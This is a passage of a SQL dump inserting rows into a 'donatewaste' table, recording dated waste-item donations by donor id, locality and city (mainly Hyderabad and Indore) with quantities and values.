(793, '2012-02-02', 67, 'Gachibowli', 'Hyderabad', 64, 1, '210.0', 7, 1470, 1470, '', '', '', '', ''),
(794, '2012-02-02', 67, 'Gachibowli', 'Hyderabad', 43, 1, '50.0', 8, 400, 400, '', '', '', '', ''),
(795, '2012-02-02', 67, 'Gachibowli', 'Hyderabad', 37, 1, '100.0', 6, 600, 600, '', '', '', '', ''),
(796, '2012-02-02', 67, 'Gachibowli', 'Hyderabad', 46, 1, '16.0', 10, 155, 155, '', '', '', '', ''),
(797, '2012-02-07', 67, 'Waverock', 'Hyderabad', 43, 1, '140.0', 8, 1120, 1120, '', '', '', '', ''),
(798, '2012-02-07', 67, 'Waverock', 'Hyderabad', 37, 1, '13.0', 6, 78, 78, '', '', '', '', ''),
(799, '2012-02-04', 109, 'Banjara Hills', 'Hyderabad', 43, 1, '15.0', 7, 102, 110, '', '', '', '', ''),
(800, '2012-03-28', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '8.0', 7, 56, 56, '', '', '', '', ''),
(801, '2012-03-28', 63, 'PadmaraoNagar', 'Hyderabad', 36, 1, '11.0', 6, 66, 66, '', '', '', '', ''),
(802, '2012-01-28', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '3.0', 5, 15, 15, '', '', '', '', ''),
(803, '2012-02-25', 63, 'PadmaraoNagar', 'Hyderabad', 46, 1, '3.0', 5, 15, 15, '', '', '', '', ''),
(804, '2012-02-25', 63, 'PadmaraoNagar', 'Hyderabad', 49, 1, '3.0', 5, 15, 15, '', '', '', '', ''),
(805, '2012-02-25', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '45.0', 8, 360, 360, '', '', '', '', ''),
(806, '2012-02-25', 63, 'PadmaraoNagar', 'Hyderabad', 36, 1, '36.0', 6, 216, 216, '', '', '', '', ''),
(807, '2012-02-25', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '5.0', 6, 30, 30, '', '', '', '', ''),
(808, '2012-02-25', 63, 'PadmaraoNagar', 'Hyderabad', 40, 1, '1.0', 15, 15, 15, '', '', '', '', ''),
(809, '2012-02-26', 73, 'Gachibowli', 'Hyderabad', 43, 1, '47.0', 8, 381, 381, '', '', '', '', ''),
(810, '2012-02-26', 73, 'Gachibowli', 'Hyderabad', 48, 1, '16.0', 10, 167, 167, '', '', '', '', ''),
(811, '2012-02-26', 73, 'Gachibowli', 'Hyderabad', 42, 1, '3.0', 6, 15, 15, '', '', '', '', ''),
(812, '2012-02-26', 73, 'Gachibowli', 'Hyderabad', 49, 1, '5.0', 5, 24, 24, '', '', '', '', ''),
(813, '2012-02-26', 73, 'Gachibowli', 'Hyderabad', 40, 1, '13.0', 20, 260, 260, '', '', '', '', ''),
(814, '2012-02-26', 73, 'Gachibowli', 'Hyderabad', 39, 2, '9.0', 1, 9, 9, '', '', '', '', ''),
(815, '2012-02-26', 73, 'Gachibowli', 'Hyderabad', 54, 1, '3.0', 1, 4, 4, '', '', '', '', ''),
(816, '2012-02-26', 73, 'Gachibowli', 'Hyderabad', 37, 1, '22.0', 7, 160, 160, '', '', '', '', ''),
(817, '2012-02-26', 72, 'Gachibowli', 'Hyderabad', 43, 1, '47.0', 8, 381, 381, '', '', '', '', ''),
(818, '2012-02-26', 72, 'Gachibowli', 'Hyderabad', 48, 1, '16.0', 10, 167, 167, '', '', '', '', ''),
(819, '2012-02-26', 72, 'Gachibowli', 'Hyderabad', 42, 1, '3.0', 6, 15, 15, '', '', '', '', ''),
(820, '2012-02-26', 72, 'Gachibowli', 'Hyderabad', 49, 1, '5.0', 5, 24, 24, '', '', '', '', ''),
(821, '2012-02-26', 72, 'Gachibowli', 'Hyderabad', 40, 1, '13.0', 20, 260, 260, '', '', '', '', ''),
(822, '2012-02-26', 72, 'Gachibowli', 'Hyderabad', 39, 2, '9.0', 1, 9, 9, '', '', '', '', ''),
(823, '2012-02-26', 72, 'Gachibowli', 'Hyderabad', 54, 1, '3.0', 1, 4, 4, '', '', '', '', ''),
(824, '2012-02-26', 72, 'Gachibowli', 'Hyderabad', 37, 1, '22.0', 7, 159, 159, '', '', '', '', ''),
(825, '2012-02-26', 88, 'Gachibowli', 'Hyderabad', 43, 1, '47.0', 8, 381, 381, '', '', '', '', ''),
(826, '2012-02-26', 88, 'Gachibowli', 'Hyderabad', 48, 1, '16.0', 10, 167, 167, '', '', '', '', ''),
(827, '2012-02-26', 88, 'Gachibowli', 'Hyderabad', 42, 1, '3.0', 6, 15, 15, '', '', '', '', ''),
(828, '2012-02-26', 88, 'Gachibowli', 'Hyderabad', 49, 1, '5.0', 5, 24, 24, '', '', '', '', ''),
(829, '2012-02-26', 88, 'Gachibowli', 'Hyderabad', 40, 1, '13.0', 20, 260, 260, '', '', '', '', ''),
(830, '2012-02-26', 88, 'Gachibowli', 'Hyderabad', 39, 2, '9.0', 1, 9, 9, '', '', '', '', ''),
(831, '2012-02-26', 88, 'Gachibowli', 'Hyderabad', 54, 1, '3.0', 1, 4, 4, '', '', '', '', ''),
(832, '2012-02-26', 88, 'Gachibowli', 'Hyderabad', 37, 1, '22.0', 7, 159, 159, '', '', '', '', ''),
(833, '2012-03-01', 67, 'Gachibowli', 'Hyderabad', 64, 1, '355.0', 7, 2485, 2485, '', '', '', '', ''),
(834, '2012-03-01', 67, 'Gachibowli', 'Hyderabad', 37, 1, '50.0', 7, 350, 350, '', '', '', '', ''),
(835, '2012-03-01', 67, 'Gachibowli', 'Hyderabad', 43, 1, '28.0', 8, 224, 224, '', '', '', '', ''),
(836, '2012-03-08', 64, 'Panjagutta', 'Hyderabad', 43, 1, '13.0', 8, 100, 100, '', '', '', '', ''),
(837, '2012-03-12', 68, 'Gachibowli', 'Hyderabad', 43, 1, '95.0', 8, 756, 756, '', '', '', '', ''),
(838, '2012-03-12', 68, 'Gachibowli', 'Hyderabad', 37, 1, '168.0', 8, 1340, 1340, '', '', '', '', ''),
(839, '2012-03-12', 68, 'Gachibowli', 'Hyderabad', 64, 1, '38.0', 6, 225, 224, '', '', '', '', ''),
(840, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 38, 1, '73.0', 25, 1825, 1825, '', '', '', '', ''),
(841, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 54, 1, '15.0', 1, 15, 15, '', '', '', '', ''),
(842, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 39, 2, '9.0', 2, 18, 18, '', '', '', '', ''),
(843, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 36, 1, '32.0', 7, 224, 224, '', '', '', '', ''),
(844, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 37, 1, '26.0', 8, 208, 208, '', '', '', '', ''),
(845, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 42, 1, '14.0', 6, 84, 84, '', '', '', '', ''),
(846, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 43, 1, '160.0', 9, 1440, 1440, '', '', '', '', ''),
(847, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 44, 1, '4.0', 8, 32, 32, '', '', '', '', ''),
(848, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 45, 1, '29.0', 15, 435, 435, '', '', '', '', ''),
(849, '2012-03-25', 73, 'Gachibowli', 'Hyderabad', 49, 1, '20.0', 5, 100, 100, '', '', '', '', ''),
(850, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 38, 1, '2.0', 25, 38, 37, '', '', '', '', ''),
(851, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 54, 1, '10.0', 1, 10, 10, '', '', '', '', ''),
(852, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 39, 2, '11.0', 1, 11, 11, '', '', '', '', ''),
(853, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 40, 1, '10.0', 22, 220, 220, '', '', '', '', ''),
(854, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 36, 1, '19.0', 7, 129, 129, '', '', '', '', ''),
(855, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 37, 1, '15.0', 8, 120, 120, '', '', '', '', ''),
(856, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 43, 1, '35.0', 9, 310, 310, '', '', '', '', ''),
(857, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 45, 1, '4.0', 15, 60, 60, '', '', '', '', ''),
(858, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 46, 1, '3.0', 12, 30, 30, '', '', '', '', ''),
(859, '2012-03-25', 88, 'Gachibowli', 'Hyderabad', 49, 1, '11.0', 5, 55, 55, '', '', '', '', ''),
(860, '2012-03-25', 72, 'Gachibowli', 'Hyderabad', 38, 1, '9.0', 25, 225, 225, '', '', '', '', ''),
(861, '2012-03-25', 72, 'Gachibowli', 'Hyderabad', 42, 1, '4.0', 6, 24, 24, '', '', '', '', ''),
(862, '2012-03-25', 72, 'Gachibowli', 'Hyderabad', 43, 1, '5.0', 9, 45, 45, '', '', '', '', ''),
(863, '2012-03-25', 72, 'Gachibowli', 'Hyderabad', 45, 1, '7.0', 15, 105, 105, '', '', '', '', ''),
(864, '2012-04-03', 67, 'Gachibowli', 'Hyderabad', 64, 1, '130.0', 7, 910, 910, '', '', '', '', ''),
(865, '2012-04-03', 67, 'Gachibowli', 'Hyderabad', 37, 1, '97.0', 7, 679, 679, '', '', '', '', ''),
(866, '2012-04-03', 67, 'Gachibowli', 'Hyderabad', 46, 1, '10.0', 12, 120, 120, '', '', '', '', ''),
(867, '2012-04-03', 67, 'Gachibowli', 'Hyderabad', 43, 1, '37.0', 8, 296, 296, '', '', '', '', ''),
(868, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 38, 1, '12.0', 25, 300, 300, '', '', '', '', ''),
(869, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 54, 1, '34.0', 1, 34, 34, '', '', '', '', ''),
(870, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 39, 2, '52.0', 0, 0, 104, '', '', '', '', ''),
(871, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 40, 1, '3.0', 22, 66, 66, '', '', '', '', ''),
(872, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 36, 1, '106.0', 7, 742, 742, '', '', '', '', ''),
(873, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 37, 1, '18.0', 7, 126, 126, '', '', '', '', ''),
(874, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 42, 1, '12.0', 6, 72, 72, '', '', '', '', ''),
(875, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 43, 1, '244.0', 8, 1952, 1952, '', '', '', '', ''),
(876, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 44, 1, '5.0', 8, 40, 40, '', '', '', '', ''),
(877, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 50, 1, '40.0', 5, 200, 200, '', '', '', '', ''),
(878, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 45, 1, '4.0', 15, 60, 68, '', '', '', '', ''),
(879, '2012-04-29', 73, 'Gachibowli', 'Hyderabad', 46, 1, '18.0', 12, 216, 216, '', '', '', '', ''),
(880, '2012-04-29', 72, 'Gachibowli', 'Hyderabad', 38, 1, '7.0', 25, 175, 163, '', '', '', '', ''),
(881, '2012-04-29', 72, 'Gachibowli', 'Hyderabad', 40, 1, '5.0', 22, 110, 121, '', '', '', '', ''),
(882, '2012-04-29', 72, 'Gachibowli', 'Hyderabad', 36, 1, '12.0', 7, 84, 87, '', '', '', '', ''),
(883, '2012-04-29', 72, 'Gachibowli', 'Hyderabad', 42, 1, '11.0', 6, 66, 66, '', '', '', '', ''),
(884, '2012-04-29', 72, 'Gachibowli', 'Hyderabad', 50, 1, '12.0', 5, 60, 60, '', '', '', '', ''),
(885, '2012-04-29', 72, 'Gachibowli', 'Hyderabad', 46, 1, '8.0', 12, 96, 102, '', '', '', '', ''),
(886, '2012-04-29', 72, 'Gachibowli', 'Hyderabad', 37, 1, '14.0', 7, 98, 98, '', '', '', '', ''),
(887, '2012-04-29', 88, 'Gachibowli', 'Hyderabad', 54, 1, '7.0', 1, 7, 7, '', '', '', '', ''),
(888, '2012-04-29', 88, 'Gachibowli', 'Hyderabad', 40, 1, '1.0', 22, 11, 11, '', '', '', '', ''),
(889, '2012-04-29', 88, 'Gachibowli', 'Hyderabad', 36, 1, '15.0', 7, 105, 105, '', '', '', '', ''),
(890, '2012-04-29', 88, 'Gachibowli', 'Hyderabad', 37, 1, '10.0', 7, 70, 70, '', '', '', '', ''),
(891, '2012-04-29', 88, 'Gachibowli', 'Hyderabad', 42, 1, '3.0', 6, 18, 18, '', '', '', '', ''),
(892, '2012-04-29', 88, 'Gachibowli', 'Hyderabad', 43, 1, '44.0', 8, 352, 352, '', '', '', '', ''),
(893, '2012-04-29', 88, 'Gachibowli', 'Hyderabad', 50, 1, '22.0', 5, 110, 110, '', '', '', '', ''),
(894, '2012-04-29', 88, 'Gachibowli', 'Hyderabad', 46, 1, '2.0', 12, 24, 24, '', '', '', '', ''),
(895, '2012-04-25', 68, 'Synopsys', 'Hyderabad', 43, 1, '38.0', 8, 304, 304, '', '', '', '', ''),
(896, '2012-04-25', 68, 'Synopsys', 'Hyderabad', 37, 1, '139.0', 7, 973, 972, '', '', '', '', ''),
(897, '2012-04-25', 68, 'Synopsys', 'Hyderabad', 64, 1, '17.0', 8, 136, 136, '', '', '', '', ''),
(898, '2012-04-25', 68, 'Synopsys', 'Hyderabad', 44, 1, '40.0', 8, 320, 320, '', '', '', '', ''),
(899, '2012-04-25', 68, 'Synopsys', 'Hyderabad', 45, 1, '7.0', 10, 70, 70, '', '', '', '', ''),
(900, '2012-04-25', 68, 'Synopsys', 'Hyderabad', 40, 1, '9.0', 22, 198, 198, '', '', '', '', ''),
(901, '2012-04-03', 68, 'Synopsys', 'Hyderabad', 43, 1, '35.0', 8, 280, 280, '', '', '', '', ''),
(902, '2012-04-03', 68, 'Synopsys', 'Hyderabad', 37, 1, '126.0', 7, 882, 882, '', '', '', '', ''),
(903, '2012-04-03', 68, 'Synopsys', 'Hyderabad', 64, 1, '13.0', 8, 104, 104, '', '', '', '', ''),
(904, '2012-04-03', 68, 'Synopsys', 'Hyderabad', 54, 1, '30.0', 1, 30, 34, '', '', '', '', ''),
(905, '2012-04-09', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '25.0', 7, 175, 175, '', '', '', '', ''),
(906, '2012-04-28', 64, 'PadmaraoNagar', 'Hyderabad', 36, 1, '68.0', 5, 340, 342, '', '', '', '', ''),
(907, '2012-04-28', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '10.0', 3, 30, 30, '', '', '', '', ''),
(908, '2012-04-28', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '7.0', 7, 49, 50, '', '', '', '', ''),
(909, '2012-04-28', 63, 'PadmaraoNagar', 'Hyderabad', 46, 1, '5.0', 6, 33, 33, '', '', '', '', ''),
(910, '2012-05-02', 67, 'Gachibowli', 'Hyderabad', 64, 1, '302.0', 7, 2114, 2114, '', '', '', '', ''),
(911, '2012-05-02', 67, 'Gachibowli', 'Hyderabad', 37, 1, '110.0', 7, 770, 770, '', '', '', '', ''),
(912, '2012-05-02', 67, 'Gachibowli', 'Hyderabad', 43, 1, '51.0', 8, 408, 408, '', '', '', '', ''),
(913, '2012-05-02', 67, 'Gachibowli', 'Hyderabad', 46, 1, '10.0', 15, 150, 150, '', '', '', '', ''),
(914, '2012-05-02', 67, 'Gachibowli', 'Hyderabad', 46, 1, '18.0', 12, 216, 216, '', '', '', '', ''),
(915, '2012-03-25', 64, 'Panjagutta-ABS', 'Hyderabad', 43, 1, '14.0', 7, 98, 100, '', '', '', '', ''),
(916, '2012-04-01', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '25.0', 7, 175, 175, '', '', '', '', ''),
(917, '2012-04-01', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '8.0', 6, 48, 50, '', '', '', '', ''),
(918, '2012-04-01', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '6.0', 5, 30, 30, '', '', '', '', ''),
(919, '2012-04-01', 63, 'PadmaraoNagar', 'Hyderabad', 45, 1, '5.0', 7, 35, 35, '', '', '', '', ''),
(920, '2012-05-11', 150, 'Gram Mundala Nayta', 'Indore', 43, 1, '63.0', 8, 500, 500, '', '', '', '', ''),
(921, '2011-01-02', 151, 'Nipaniya', 'Indore', 50, 1, '2.0', 5, 10, 10, '', '', '', '', ''),
(922, '2011-01-02', 151, 'Nipaniya', 'Indore', 50, 1, '3.0', 20, 60, 60, '', '', '', '', ''),
(923, '2011-01-02', 151, 'Nipaniya', 'Indore', 50, 1, '3.0', 20, 50, 50, '', '', '', '', ''),
(924, '2011-01-02', 151, 'Nipaniya', 'Indore', 42, 1, '2.0', 1, 2, 2, '', '', '', '', ''),
(925, '2011-01-02', 151, 'Nipaniya', 'Indore', 43, 1, '2.0', 8, 16, 16, '', '', '', '', ''),
(926, '2011-01-02', 151, 'Nipaniya', 'Indore', 42, 1, '14.0', 7, 98, 98, '', '', '', '', ''),
(927, '2011-01-02', 151, 'Nipaniya', 'Indore', 41, 1, '3.0', 5, 15, 15, '', '', '', '', ''),
(928, '2011-02-06', 151, 'Nipaniya', 'Indore', 44, 1, '2.0', 9, 18, 18, '', '', '', '', ''),
(929, '2011-02-06', 151, 'Nipaniya', 'Indore', 50, 1, '1.0', 5, 5, 5, '', '', '', '', ''),
(930, '2011-02-06', 151, 'Nipaniya', 'Indore', 37, 1, '4.0', 7, 25, 25, '', '', '', '', ''),
(931, '2011-02-06', 151, 'Nipaniya', 'Indore', 50, 1, '1.0', 4, 4, 4, '', '', '', '', ''),
(932, '2011-02-06', 151, 'Nipaniya', 'Indore', 39, 1, '1.0', 8, 8, 8, '', '', '', '', ''),
(933, '2011-02-20', 152, 'Nipaniya', 'Indore', 36, 1, '4.0', 5, 18, 18, '', '', '', '', ''),
(934, '2011-02-20', 152, 'Nipaniya', 'Indore', 44, 1, '24.0', 8, 192, 192, '', '', '', '', ''),
(935, '2011-02-20', 152, 'Nipaniya', 'Indore', 46, 1, '2.0', 20, 40, 40, '', '', '', '', ''),
(936, '2011-02-20', 152, 'Nipaniya', 'Indore', 53, 1, '2.0', 15, 30, 30, '', '', '', '', ''),
(937, '2011-02-20', 152, 'Nipaniya', 'Indore', 45, 1, '7.0', 3, 21, 21, '', '', '', '', ''),
(938, '2011-02-27', 152, 'Nipaniya', 'Indore', 37, 1, '10.0', 8, 76, 76, '', '', '', '', ''),
(939, '2011-02-27', 152, 'Nipaniya', 'Indore', 37, 1, '6.0', 2, 11, 11, '', '', '', '', ''),
(940, '2011-02-27', 152, 'Nipaniya', 'Indore', 49, 1, '6.0', 6, 33, 33, '', '', '', '', ''),
(941, '2011-02-27', 152, 'Nipaniya', 'Indore', 45, 1, '8.0', 20, 156, 156, '', '', '', '', ''),
(942, '2011-02-27', 152, 'Nipaniya', 'Indore', 23, 1, '10.0', 1, 10, 10, '', '', '', '', ''),
(943, '2011-03-01', 152, 'Nipaniya', 'Indore', 44, 1, '98.0', 9, 882, 882, '', '', '', '', ''),
(944, '2011-03-06', 152, 'Nipaniya', 'Indore', 46, 1, '3.0', 20, 60, 60, '', '', '', '', ''),
(945, '2011-03-06', 152, 'Nipaniya', 'Indore', 37, 1, '10.0', 6, 57, 57, '', '', '', '', ''),
(946, '2011-03-06', 152, 'Nipaniya', 'Indore', 45, 1, '4.0', 20, 80, 80, '', '', '', '', ''),
(947, '2011-03-06', 152, 'Nipaniya', 'Indore', 37, 1, '12.0', 2, 24, 24, '', '', '', '', ''),
(948, '2011-03-06', 152, 'Nipaniya', 'Indore', 50, 1, '2.0', 3, 6, 6, '', '', '', '', '');
INSERT INTO `donatewaste` (`donationid`, `dateofdonation`, `DONOR_ID`, `placeofdonation`, `city`, `item_id`, `donationunit`, `donationquantity`, `donationunitvalue`, `donationcalculatedvalue`, `donationvalue`, `note`, `author`, `publisher`, `category`, `subject`) VALUES
(949, '2011-03-06', 152, 'Nipaniya', 'Indore', 41, 1, '4.0', 15, 60, 60, '', '', '', '', ''),
(950, '2011-03-06', 152, 'Nipaniya', 'Indore', 50, 1, '9.0', 6, 54, 54, '', '', '', '', ''),
(951, '2011-03-06', 152, 'Nipaniya', 'Indore', 43, 1, '22.0', 9, 198, 198, '', '', '', '', ''),
(952, '2011-03-06', 153, 'Pipliyanha', 'Indore', 44, 1, '28.0', 8, 224, 224, '', '', '', '', ''),
(953, '2011-03-06', 153, 'Pipliyanha', 'Indore', 49, 1, '3.0', 5, 12, 12, '', '', '', '', ''),
(954, '2011-03-06', 153, 'Pipliyanha', 'Indore', 45, 1, '6.0', 15, 84, 84, '', '', '', '', ''),
(955, '2011-03-06', 153, 'Pipliyanha', 'Indore', 46, 1, '1.0', 7, 8, 8, '', '', '', '', ''),
(956, '2011-03-06', 153, 'Pipliyanha', 'Indore', 50, 1, '7.0', 5, 35, 35, '', '', '', '', ''),
(957, '2011-03-06', 153, 'Pipliyanha', 'Indore', 37, 1, '2.0', 5, 8, 8, '', '', '', '', ''),
(958, '2011-03-06', 153, 'Pipliyanha', 'Indore', 39, 1, '9.0', 1, 9, 9, '', '', '', '', ''),
(959, '2011-03-06', 153, 'Pipliyanha', 'Indore', 37, 1, '1.0', 1, 1, 1, '', '', '', '', ''),
(960, '2011-03-06', 153, 'Pipliyanha', 'Indore', 38, 2, '1.0', 0, 200, 200, '', '', '', '', ''),
(961, '2011-03-06', 153, 'Pipliyanha', 'Indore', 41, 2, '1.0', 0, 100, 100, '', '', '', '', ''),
(962, '2012-01-19', 45, 'Indore', 'Indore', 65, 1, '800.0', 5, 4000, 4000, '', '', '', '', ''),
(963, '2012-05-26', 63, 'PadmaraoNagar', 'Hyderabad', 38, 1, '5.0', 20, 100, 100, '', '', '', '', ''),
(964, '2012-05-26', 63, 'PadmaraoNagar', 'Hyderabad', 39, 2, '20.0', 1, 20, 20, '', '', '', '', ''),
(965, '2012-05-26', 63, 'PadmaraoNagar', 'Hyderabad', 37, 1, '6.0', 2, 12, 12, '', '', '', '', ''),
(966, '2012-05-26', 63, 'PadmaraoNagar', 'Hyderabad', 42, 1, '8.0', 4, 32, 34, ' ', '', '', '', ''),
(967, '2012-05-26', 63, 'PadmaraoNagar', 'Hyderabad', 43, 1, '20.0', 7, 140, 143, '', '', '', '', ''),
(968, '2012-05-26', 63, 'PadmaraoNagar', 'Hyderabad', 50, 1, '5.0', 4, 20, 20, '', '', '', '', ''),
(969, '2012-05-26', 63, 'PadmaraoNagar', 'Hyderabad', 49, 1, '5.0', 1, 2, 3, '', '', '', '', ''),
(970, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 38, 1, '11.0', 25, 275, 295, '', '', '', '', ''),
(971, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 54, 2, '30.0', 1, 30, 46, '', '', '', '', ''),
(972, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 40, 1, '5.0', 20, 110, 121, '', '', '', '', ''),
(973, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 36, 1, '28.0', 7, 196, 196, '', '', '', '', ''),
(974, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 37, 1, '21.0', 7, 147, 147, '', '', '', '', ''),
(975, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 42, 1, '16.0', 6, 96, 96, '', '', '', '', ''),
(976, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 43, 1, '320.0', 8, 2560, 2560, '', '', '', '', ''),
(977, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 44, 1, '3.0', 10, 30, 30, '', '', '', '', ''),
(978, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 50, 1, '17.0', 5, 85, 85, '', '', '', '', ''),
(979, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 45, 1, '14.0', 12, 168, 174, '', '', '', '', ''),
(980, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 46, 1, '13.0', 15, 195, 195, '', '', '', '', ''),
(981, '2012-05-27', 73, 'Gachibowli', 'Hyderabad', 49, 1, '8.0', 5, 40, 40, '', '', '', '', ''),
(982, '2012-05-27', 88, 'Gachibowli', 'Hyderabad', 54, 2, '26.0', 1, 26, 26, '', '', '', '', ''),
(983, '2012-05-27', 88, 'Gachibowli', 'Hyderabad', 36, 1, '8.0', 7, 56, 56, '', '', '', '', ''),
(984, '2012-05-27', 88, 'Gachibowli', 'Hyderabad', 37, 1, '12.0', 7, 84, 84, '', '', '', '', ''),
(985, '2012-05-27', 88, 'Gachibowli', 'Hyderabad', 42, 1, '4.0', 6, 24, 24, '', '', '', '', ''),
(986, '2012-05-27', 88, 'Gachibowli', 'Hyderabad', 43, 1, '32.0', 8, 256, 256, '', '', '', '', ''),
(987, '2012-05-27', 88, 'Gachibowli', 'Hyderabad', 50, 1, '9.0', 5, 45, 45, '', '', '', '', ''),
(988, '2012-05-27', 88, 'Gachibowli', 'Hyderabad', 45, 1, '2.0', 12, 24, 26, '', '', '', '', ''),
(989, '2012-05-27', 88, 'Gachibowli', 'Hyderabad', 46, 1, '4.0', 15, 60, 60, '', '', '', '', ''),
(990, '2012-05-27', 72, 'Gachibowli', 'hyderabad', 38, 1, '16.0', 25, 400, 400, '', '', '', '', ''),
(991, '2012-05-27', 72, 'Gachibowli', 'hyderabad', 54, 2, '1.0', 15, 15, 17, '', '', '', '', ''),
(992, '2012-05-27', 72, 'Gachibowli', 'hyderabad', 37, 1, '1.0', 7, 7, 7, '', '', '', '', ''),
(993, '2012-05-27', 72, 'Gachibowli', 'hyderabad', 42, 1, '14.0', 6, 84, 84, '', '', '', '', ''),
(994, '2012-05-27', 72, 'Gachibowli', 'hyderabad', 43, 1, '12.0', 8, 96, 96, '', '', '', '', ''),
(995, '2012-05-27', 72, 'Gachibowli', 'hyderabad', 50, 1, '3.0', 5, 5, 15, '', '', '', '', ''),
(996, '2012-05-27', 72, 'Gachibowli', 'hyderabad', 46, 1, '3.0', 15, 45, 45, '', '', '', '', ''),
(997, '2012-05-27', 72, 'Gachibowli', 'hyderabad', 40, 1, '0.5', 22, 11, 11, '', '', '', '', ''),
(998, '0000-00-00', 64, 'Panjagutta', 'Hyderabad', 37, 1, '3.0', 7, 21, 21, '', '', '', '', ''),
(999, '0000-00-00', 64, 'Panjagutta', 'Hyderabad', 42, 1, '7.0', 5, 35, 35, '', '', '', '', ''),
(1000, '0000-00-00', 64, 'Panjagutta', 'Hyderabad', 43, 1, '1.0', 8, 8, 8, '', '', '', '', ''),
(1001, '0000-00-00', 64, 'Panjagutta', 'Hyderabad', 50, 1, '6.0', 4, 24, 24, '', '', '', '', ''),
(1002, '0000-00-00', 64, 'Panjagutta', 'Hyderabad', 46, 1, '3.0', 12, 36, 36, '', '', '', '', ''),
(1003, '0000-00-00', 138, 'Multiple Donor', 'Hyderabad', 38, 1, '100.0', 25, 2500, 2500, '', '', '', '', ''),
(1004, '0000-00-00', 154, 'Gachibowli', 'Hyderabad', 38, 1, '9.0', 25, 238, 239, '', '', '', '', ''),
(1005, '0000-00-00', 154, 'Gachibowli', 'Hyderabad', 50, 1, '18.0', 6, 108, 111, '', '', '', '', ''),
(1006, '2012-05-13', 162, 'Limbodhi', 'Indore', 43, 1, '30.0', 8, 240, 240, '', '', '', '', ''),
(1007, '2012-05-13', 162, 'Limbodhi', 'Indore', 36, 1, '10.0', 6, 60, 60, '', '', '', '', ''),
(1008, '2012-05-13', 162, 'Limbodhi', 'Indore', 42, 1, '4.0', 6, 24, 24, '', '', '', '', ''),
(1009, '2012-05-13', 162, 'Limbodhi', 'Indore', 43, 1, '13.0', 8, 97, 96, '', '', '', '', ''),
(1010, '2012-05-27', 153, 'Pipliyanha', 'Indore', 43, 1, '9.0', 8, 72, 72, '', '', '', '', ''),
(1011, '2012-05-27', 153, 'Pipliyanha', 'Indore', 37, 1, '5.0', 6, 30, 30, '', '', '', '', ''),
(1012, '2012-05-27', 153, 'Pipliyanha', 'Indore', 36, 1, '8.0', 6, 48, 48, '', '', '', '', ''),
(1013, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 38, 1, '22.0', 25, 550, 550, '', '', '', '', ''),
(1014, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 54, 1, '33.0', 1, 33, 33, '', '', '', '', ''),
(1015, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 40, 1, '4.0', 22, 88, 88, '', '', '', '', ''),
(1016, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 36, 1, '36.0', 7, 252, 252, '', '', '', '', ''),
(1017, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 37, 1, '29.0', 7, 203, 203, '', '', '', '', ''),
(1018, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 42, 1, '10.0', 6, 60, 60, '', '', '', '', ''),
(1019, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 43, 1, '202.0', 8, 1616, 1616, '', '', '', '', ''),
(1020, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 44, 1, '3.0', 10, 30, 30, '', '', '', '', ''),
(1021, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 50, 1, '14.0', 5, 70, 70, '', '', '', '', ''),
(1022, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 45, 1, '2.0', 15, 30, 30, '', '', '', '', ''),
(1023, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 46, 1, '7.0', 12, 84, 84, '', '', '', '', ''),
(1024, '0000-00-00', 73, 'Gachibowli', 'Hyderabad', 49, 1, '10.0', 5, 50, 50, '', '', '', '', ''),
